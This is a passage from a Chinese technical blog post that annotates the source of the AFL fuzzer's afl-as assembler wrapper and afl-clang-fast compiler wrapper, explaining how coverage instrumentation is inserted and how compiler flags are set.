inst_ratio /= <span class="number">3</span>;       <span class="comment">// 降低插桩密度（减少冲突）</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 核心插桩逻辑 */</span></span><br><span class="line">  <span class="keyword">if</span> (!just_version) add_instrumentation();  <span class="comment">// 如果不是仅显示版本，执行插桩</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 创建子进程调用真正的汇编器 */</span></span><br><span class="line">  <span class="keyword">if</span> (!(pid = fork())) &#123;  <span class="comment">// 子进程分支</span></span><br><span class="line">    <span class="comment">// 执行GNU as汇编器（使用修改后的参数）</span></span><br><span class="line">    execvp(as_params[<span class="number">0</span>], (<span class="keyword">char</span>**)as_params);</span><br><span class="line">    FATAL(<span class="string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, as_params[<span class="number">0</span>]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 父进程处理 */</span></span><br><span class="line">  <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;fork() failed&quot;</span>);  <span class="comment">// 检查fork是否成功</span></span><br><span class="line">  <span class="keyword">if</span> (waitpid(pid, &amp;status, <span class="number">0</span>) &lt;= <span class="number">0</span>) PFATAL(<span class="string">&quot;waitpid() failed&quot;</span>);  <span class="comment">// 等待子进程结束</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 清理临时文件 */</span></span><br><span class="line">  <span class="keyword">if</span> (!getenv(<span class="string">&quot;AFL_KEEP_ASSEMBLY&quot;</span>)) unlink(modified_file);  <span class="comment">// 除非要求保留，否则删除临时文件</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 退出并传递汇编器的退出状态 */</span></span><br><span class="line">  <span class="built_in">exit</span>(WEXITSTATUS(status));  <span class="comment">// 确保返回码与as一致</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们先梳理一下代码里几个不能完全写在注释里的点</p><h3 id="trampoline-fmt-32与trampoline-fmt-64"><a href="#trampoline-fmt-32与trampoline-fmt-64" class="headerlink" title="trampoline_fmt_32与trampoline_fmt_64"></a>trampoline_fmt_32与trampoline_fmt_64</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> u8* trampoline_fmt_32 =</span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- AFL TRAMPOLINE (32-BIT) --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.align 4\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leal -16(%%esp), %%esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl %%edi,  0(%%esp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl %%edx,  4(%%esp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl %%ecx,  8(%%esp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl %%eax, 12(%%esp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl $0x%08x, %%ecx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;call __afl_maybe_log\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl 12(%%esp), %%eax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl  8(%%esp), %%ecx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl  4(%%esp), %%edx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movl  0(%%esp), %%edi\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leal 16(%%esp), %%esp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- END --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> u8* trampoline_fmt_64 =</span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- AFL TRAMPOLINE (64-BIT) --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.align 4\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leaq -(128+24)(%%rsp), %%rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rdx,  0(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rcx,  8(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rax, 16(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq $0x%08x, %%rcx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;call __afl_maybe_log\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq 16(%%rsp), %%rax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq  8(%%rsp), %%rcx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq  0(%%rsp), %%rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leaq (128+24)(%%rsp), %%rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- END --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>从上面的代码中我们可以知道trampoline_fmt_32和trampoline_fmt_64是被加入到由编译器生成的.s文件中</p><h3 id="OpenBSD"><a href="#OpenBSD" class="headerlink" title="OpenBSD"></a>OpenBSD</h3><p>OpenBSD跳转表是OpenBSD系统中使用gcc或者clang编译得到的，遇到OpenBSD跳转表后的跳过逻辑我举个例子看看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text</span><br><span class="line">.globlcheck_value</span><br><span class="line">check_value:</span><br><span class="line">pushq%rbp</span><br><span class="line">.p2align 4,,10   # ← AFL 检测点 (设置 skip_next_label=1)</span><br><span class="line">.p2align 3</span><br><span class="line">.L4:                # ← 跳转表标签 (被跳过)</span><br><span class="line">.long.L3-.L4</span><br><span class="line">.L3:                # ← 正常标签 (会插桩)</span><br><span class="line">movl$10, %eax</span><br></pre></td></tr></table></figure><p>会跳过遇到OpenBSD后的第一个标签，也就是上面的.L4</p><h3 id="add-instrumentation的逻辑"><a href="#add-instrumentation的逻辑" class="headerlink" title="add_instrumentation的逻辑"></a>add_instrumentation的逻辑</h3><p>add_instrumentation是afl-as的核心代码，这里介绍一下其核心逻辑</p><h4 id="一、整体处理流程"><a href="#一、整体处理流程" class="headerlink" title="一、整体处理流程"></a><strong>一、整体处理流程</strong></h4><ol><li><strong>逐行扫描</strong>：<br>按顺序读取汇编文件每一行，同时生成插桩后的新文件。</li><li><strong>双阶段处理</strong>：<ul><li><strong>延迟插桩</strong>：标记关键位置，在后续实际指令前插入</li><li><strong>立即插桩</strong>：遇到特定指令时直接插入</li></ul></li><li><strong>状态机驱动</strong>：<br>通过多个状态标志动态控制插桩行为：<ul><li><code>instr_ok</code>：是否在可插桩的代码段（.text）</li><li><code>skip_*</code>：跳过特殊区域（Intel语法/内联汇编等）</li><li><code>instrument_next</code>：延迟插桩标记</li></ul></li></ol><h4 id="二、关键插桩位置"><a href="#二、关键插桩位置" class="headerlink" title="二、关键插桩位置"></a><strong>二、关键插桩位置</strong></h4><ol><li><strong>函数入口点</strong></li></ol><ul><li><strong>识别特征</strong>：<br>非局部标签（如 <code>main:</code>，无前导<code>.</code>或<code>L</code>）</li><li><strong>插桩方式</strong>：<br>在函数标签后的<strong>第一条指令前</strong>插入跟踪代码</li><li><strong>目的</strong>：<br>记录函数调用事件</li></ul><ol start="2"><li><strong>条件分支</strong></li></ol><ul><li><strong>识别特征</strong>：<br>条件跳转指令（<code>j</code>开头非<code>jmp</code>，如 <code>jnz</code>, <code>je</code>）</li><li><strong>插桩方式</strong>：<br><strong>紧跟指令后</strong>立即插入</li><li><strong>目的</strong>：<br>捕获分支未执行路径（not-taken path）</li></ul><ol start="3"><li><strong>分支目标</strong></li></ol><ul><li><strong>识别特征</strong>：<br>编译器生成的局部标签（<code>.L0:</code>, <code>.LBB0_0:</code>）</li><li><strong>插桩方式</strong>：<br>在标签后的<strong>第一条指令前</strong>插入</li><li><strong>目的</strong>：<br>记录分支目标执行情况</li></ul><h4 id="三、跳过机制"><a href="#三、跳过机制" class="headerlink" title="三、跳过机制"></a><strong>三、跳过机制</strong></h4><ol><li><strong>代码段过滤</strong></li></ol><ul><li><strong>只插桩</strong>：<br><code>.text</code> 代码段（通过 <code>.section</code> 指令识别）</li><li><strong>跳过</strong>：<br><code>.data</code>/<code>.bss</code> 数据段及其他非代码段</li></ul><ol start="2"><li><strong>语法块跳过</strong></li></ol><ul><li><strong>Intel语法块</strong>：<br>检测 <code>.intel_syntax</code> 指令，跳过整个语法块</li><li><strong>内联汇编块</strong>：<br>跳过 <code>#APP</code> 和 <code>#NO_APP</code> 之间的代码</li></ul><ol start="3"><li><strong>平台特殊处理</strong></li></ol><ul><li><strong>OpenBSD跳转表</strong>：<ol><li>检测 <code>.p2align</code> 指令序列（特征标记）</li><li>跳过后续第一个标签的插桩</li><li>避免破坏跳转表偏移计算</li></ol></li><li><strong>macOS标签差异</strong>：<br>处理无前导点<code>.</code>的标签格式（如 <code>L0:</code> vs <code>.L0:</code>）</li></ul><p>这里再用图总结一下add_instrumentation的逻辑</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">graph LR</span><br><span class="line">    A[开始扫描] --&gt; B&#123;行类型判断&#125;</span><br><span class="line">    B --&gt;|普通指令| C[保持原样输出]</span><br><span class="line">    B --&gt;|段指令| D[更新段状态]</span><br><span class="line">    B --&gt;|标签| E&#123;标签类型&#125;</span><br><span class="line">    E --&gt;|函数入口| F[标记延迟插桩]</span><br><span class="line">    E --&gt;|分支目标| G[按规则标记]</span><br><span class="line">    E --&gt;|特殊标签| H[跳过处理]</span><br><span class="line">    B --&gt;|条件跳转| I[立即插桩]</span><br><span class="line">    B --&gt;|对齐指令| J[检测跳转表]</span><br><span class="line">    J --&gt; K[设置标签跳过]</span><br><span class="line">    F --&gt; L[后续指令前插桩]</span><br><span class="line">    G --&gt; L</span><br><span class="line">    I --&gt; M[直接输出桩代码]</span><br><span class="line">    L --&gt; N[输出桩代码]</span><br><span class="line">    C --&gt; O[写输出文件]</span><br><span class="line">    N --&gt; O</span><br><span class="line">    O --&gt; P&#123;文件结束？&#125;</span><br><span class="line">    P --&gt;|否| A</span><br><span class="line">    P --&gt;|是| Q[注入主桩代码]</span><br><span class="line">    Q --&gt; R[输出统计]</span><br></pre></td></tr></table></figure><h2 id="afl-fast-clang"><a href="#afl-fast-clang" class="headerlink" title="afl-fast-clang"></a>afl-fast-clang</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Copyright 2015 Google LLC All rights reserved.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"><span class="comment">  you may not use this file except in compliance with the License.</span></span><br><span class="line"><span class="comment">  You may obtain a copy of the License at:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="comment">  distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span></span><br><span class="line"><span class="comment">  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="comment">  See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment">  limitations under the License.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   american fuzzy lop - LLVM-mode wrapper for clang</span></span><br><span class="line"><span class="comment">   ------------------------------------------------</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Written by Laszlo Szekeres &lt;lszekeres@google.com&gt; and</span></span><br><span class="line"><span class="comment">              Michal Zalewski &lt;lcamtuf@google.com&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   LLVM integration design comes from Laszlo Szekeres.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   This program is a drop-in replacement for clang, similar in most respects</span></span><br><span class="line"><span class="comment">   to ../afl-gcc. It tries to figure out compilation mode, adds a bunch</span></span><br><span class="line"><span class="comment">   of flags, and then calls the real compiler.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AFL_MAIN</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;../config.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;../types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;../debug.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;../alloc-inl.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> u8*  obj_path;               <span class="comment">/* Path to runtime libraries         */</span></span><br><span class="line"><span class="keyword">static</span> u8** cc_params;              <span class="comment">/* Parameters passed to the real CC  */</span></span><br><span class="line"><span class="keyword">static</span> u32  cc_par_cnt = <span class="number">1</span>;         <span class="comment">/* Param count, including argv0      */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Try to find the runtime libraries. If that fails, abort. */</span></span><br><span class="line"><span class="comment">/* 查找 AFL 运行时对象文件 afl-llvm-rt.o 的路径 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">find_obj</span><span class="params">(u8* argv0)</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  u8 *afl_path = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_PATH&quot;</span>);<span class="comment">// 尝试从环境变量 AFL_PATH 获取路径</span></span><br><span class="line">  u8 *slash, *tmp;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (afl_path) &#123;</span><br><span class="line">    <span class="comment">// 拼接完整路径: AFL_PATH + &quot;/afl-llvm-rt.o&quot;</span></span><br><span class="line">    tmp = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/afl-llvm-rt.o&quot;</span>, afl_path);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">access</span>(tmp, R_OK)) &#123;</span><br><span class="line">      obj_path = afl_path;<span class="comment">// 验证成功，保存路径</span></span><br><span class="line">      <span class="built_in">ck_free</span>(tmp);<span class="comment">// 释放临时字符串</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ck_free</span>(tmp);<span class="comment">// 文件不可读，释放临时字符串</span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 尝试从 argv0 (当前可执行文件路径) 获取目录</span></span><br><span class="line">  slash = <span class="built_in">strrchr</span>(argv0, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (slash) &#123;</span><br><span class="line"></span><br><span class="line">    u8 *dir;</span><br><span class="line"></span><br><span class="line">    *slash = <span class="number">0</span>;<span class="comment">// 临时截断字符串获取目录</span></span><br><span class="line">    dir = <span class="built_in">ck_strdup</span>(argv0);<span class="comment">// 复制目录字符串</span></span><br><span class="line">    *slash = <span class="string">&#x27;/&#x27;</span>;<span class="comment">// 恢复原始路径</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 拼接路径: 当前目录 + &quot;/afl-llvm-rt.o&quot;</span></span><br><span class="line">    tmp = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/afl-llvm-rt.o&quot;</span>, dir);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">access</span>(tmp, R_OK)) &#123;</span><br><span class="line">      obj_path = dir;           <span class="comment">// 验证成功，保存路径</span></span><br><span class="line">      <span class="built_in">ck_free</span>(tmp);         <span class="comment">// 释放临时字符串</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 清理资源</span></span><br><span class="line">    <span class="built_in">ck_free</span>(tmp);</span><br><span class="line">    <span class="built_in">ck_free</span>(dir);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">access</span>(AFL_PATH <span class="string">&quot;/afl-llvm-rt.o&quot;</span>, R_OK)) &#123;</span><br><span class="line">    obj_path = AFL_PATH;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 所有尝试均失败，报错退出</span></span><br><span class="line">  <span class="built_in">FATAL</span>(<span class="string">&quot;Unable to find &#x27;afl-llvm-rt.o&#x27; or &#x27;afl-llvm-pass.so&#x27;. Please set AFL_PATH&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Copy argv to cc_params, making the necessary edits. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">edit_params</span><span class="params">(u32 argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 标志变量初始化</span></span><br><span class="line">  u8 fortify_set = <span class="number">0</span>, asan_set = <span class="number">0</span>, x_set = <span class="number">0</span>, bit_mode = <span class="number">0</span>;</span><br><span class="line">  u8 *name;</span><br><span class="line">  <span class="comment">// 分配参数数组 (原始参数 + 128个额外参数空间)</span></span><br><span class="line">  cc_params = <span class="built_in">ck_alloc</span>((argc + <span class="number">128</span>) * <span class="built_in"><span class="keyword">sizeof</span></span>(u8*));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从argv[0]提取程序名 (不含路径)</span></span><br><span class="line">  name = <span class="built_in">strrchr</span>(argv[<span class="number">0</span>], <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!name) name = argv[<span class="number">0</span>]; <span class="keyword">else</span> name++;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-clang-fast++&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">// C++: 优先使用AFL_CXX环境变量，否则默认clang++</span></span><br><span class="line">    u8* alt_cxx = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">    cc_params[<span class="number">0</span>] = alt_cxx ? alt_cxx : (u8*)<span class="string">&quot;clang++&quot;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// C: 优先使用AFL_CC环境变量，否则默认clang</span></span><br><span class="line">    u8* alt_cc = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line">    cc_params[<span class="number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="string">&quot;clang&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There are two ways to compile afl-clang-fast. In the traditional mode, we</span></span><br><span class="line"><span class="comment">     use afl-llvm-pass.so to inject instrumentation. In the experimental</span></span><br><span class="line"><span class="comment">     &#x27;trace-pc-guard&#x27; mode, we use native LLVM instrumentation callbacks</span></span><br><span class="line"><span class="comment">     instead. The latter is a very recent addition - see:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     http://clang.llvm.org/docs/SanitizerCoverage.html#tracing-pcs-with-guards */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据编译配置选择插桩模式</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> USE_TRACE_PC</span></span><br><span class="line">  cc_params[cc_par_cnt++] = <span class="string">&quot;-fsanitize-coverage=trace-pc-guard&quot;</span>;</span><br><span class="line"><span class="comment">//#ifndef __ANDROID__</span></span><br><span class="line"><span class="comment">//  cc_params[cc_par_cnt++] = &quot;-mllvm&quot;;</span></span><br><span class="line"><span class="comment">//  cc_params[cc_par_cnt++] = &quot;-sanitizer-coverage-block-threshold=0&quot;;</span></span><br><span class="line"><span class="comment">//#endif</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="comment">// 传统LLVM pass模式</span></span><br><span class="line">  cc_params[cc_par_cnt++] = <span class="string">&quot;-Xclang&quot;</span>; <span class="comment">// 向clang前端传递参数</span></span><br><span class="line">  cc_params[cc_par_cnt++] = <span class="string">&quot;-load&quot;</span>; <span class="comment">// 加载LLVM插件</span></span><br><span class="line">  cc_params[cc_par_cnt++] = <span class="string">&quot;-Xclang&quot;</span>;</span><br><span class="line">  cc_params[cc_par_cnt++] = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/afl-llvm-pass.so&quot;</span>, obj_path);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^USE_TRACE_PC */</span></span></span><br><span class="line"></span><br><span class="line">  cc_params[cc_par_cnt++] = <span class="string">&quot;-Qunused-arguments&quot;</span>;<span class="comment">// 忽略未使用的命令行参数 (避免clang警告)</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// 遍历原始参数 (跳过程序名)</span></span><br><span class="line">  <span class="keyword">while</span> (--argc) &#123;</span><br><span class="line">    u8* cur = *(++argv);</span><br><span class="line">    <span class="comment">// 检测架构/位宽设置</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-m32&quot;</span>)) bit_mode = <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;armv7a-linux-androideabi&quot;</span>)) bit_mode = <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-m64&quot;</span>)) bit_mode = <span class="number">64</span>;</span><br><span class="line">    <span class="comment">// 检测语言指定标记 (-x)</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-x&quot;</span>)) x_set = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 检测ASAN/MSAN是否已启用</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-fsanitize=address&quot;</span>) ||</span><br><span class="line">        !<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-fsanitize=memory&quot;</span>)) asan_set = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 检测FORTIFY_SOURCE是否设置</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(cur, <span class="string">&quot;FORTIFY_SOURCE&quot;</span>)) fortify_set = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 忽略可能导致链接问题的参数</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-Wl,-z,defs&quot;</span>) ||</span><br><span class="line">        !<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-Wl,--no-undefined&quot;</span>)) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="comment">// 保留其他参数</span></span><br><span class="line">    cc_params[cc_par_cnt++] = cur;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// AFL_HARDEN 加固模式</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HARDEN&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">// 启用全栈保护</span></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fstack-protector-all&quot;</span>;</span><br><span class="line">    <span class="comment">// 若未设置则添加 FORTIFY_SOURCE</span></span><br><span class="line">    <span class="keyword">if</span> (!fortify_set)</span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="string">&quot;-D_FORTIFY_SOURCE=2&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!asan_set) &#123;</span><br><span class="line">    <span class="comment">// ASAN (Address Sanitizer)</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_ASAN&quot;</span>)) &#123;</span><br><span class="line">      <span class="comment">// 冲突检测</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_MSAN&quot;</span>))</span><br><span class="line">        <span class="built_in">FATAL</span>(<span class="string">&quot;ASAN and MSAN are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HARDEN&quot;</span>))</span><br><span class="line">        <span class="built_in">FATAL</span>(<span class="string">&quot;ASAN and AFL_HARDEN are mutually exclusive&quot;</span>);</span><br><span class="line">       <span class="comment">// 设置ASAN参数</span></span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="string">&quot;-U_FORTIFY_SOURCE&quot;</span>;</span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="string">&quot;-fsanitize=address&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_MSAN&quot;</span>)) &#123;<span class="comment">// MSAN (Memory Sanitizer)</span></span><br><span class="line">      <span class="comment">// 冲突检测</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_ASAN&quot;</span>))</span><br><span class="line">        <span class="built_in">FATAL</span>(<span class="string">&quot;ASAN and MSAN are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HARDEN&quot;</span>))</span><br><span class="line">        <span class="built_in">FATAL</span>(<span class="string">&quot;MSAN and AFL_HARDEN are mutually exclusive&quot;</span>);</span><br><span class="line">      <span class="comment">// 设置MSAN参数</span></span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="string">&quot;-U_FORTIFY_SOURCE&quot;</span>;</span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="string">&quot;-fsanitize=memory&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// trace-pc 模式特定检查</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> USE_TRACE_PC</span></span><br><span class="line">   <span class="comment">// 该模式下不支持插桩比例设置</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_INST_RATIO&quot;</span>))</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;AFL_INST_RATIO not available at compile time with &#x27;trace-pc&#x27;.&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* USE_TRACE_PC */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">getenv</span>(<span class="string">&quot;AFL_DONT_OPTIMIZE&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">// 默认优化设置 (除非 AFL_DONT_OPTIMIZE 被设置)</span></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-g&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-O3&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-funroll-loops&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_BUILTIN&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">// 禁用特定内置函数 (AFL_NO_BUILTIN)</span></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strncmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcasecmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strncasecmp&quot;</span>;</span><br><span class="line">    